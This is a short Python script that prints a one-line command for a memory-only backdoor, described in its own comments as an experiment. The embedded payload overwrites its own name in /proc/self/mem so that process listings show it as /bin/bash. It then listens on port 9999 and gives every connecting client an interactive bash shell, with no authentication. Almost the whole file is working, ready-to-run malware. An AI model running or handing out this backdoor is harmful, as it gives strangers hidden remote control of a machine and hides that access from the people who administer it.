#!/usr/bin/env python

# This script prints a simple one-liner memory-only backdoor agent which hides from ps.

# It renames itself within the process list using a really hackish (AND POTENTIALLY DANGEROUS) /proc/self/mem rewrite 
# and spawns a shell on port 9999. Just an experiment, there are simplest way to run unnoticed in the
# process list (see the technique used by EmPyre: https://github.com/adaptivethreat/EmPyre)

template = """
import sys,re,pty,os,socket
n="/bin/bash"
P=4096
f="/proc/self/"
c=open(f+"cmdline").read()
mp=open(f+"maps").read(65536)
m=re.search("([0-9a-f]+)-([0-9a-f]+)\s+rw.+\[stack\]\\n", mp)
e=int("0x"+m.group(2), 0)
m=open(f+"mem", "r+")
m.seek(e-(2*P))
s=m.read(8192)
i=s.index(c)
m.seek(e-(2*P)+i)
m.write(n)
m.write("\\x00"*(len(c)-len(n)+1))
m.close()
k=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
k.bind(("",9999))
k.listen(1)
while 1:
 (r, a)=k.accept()
 os.dup2(r.fileno(),0)
 os.dup2(r.fileno(),1)
 os.dup2(r.fileno(),2)
 pty.spawn("/bin/bash")
k.close()
"""

print 'python -c $%s' % (template.strip().__repr__())
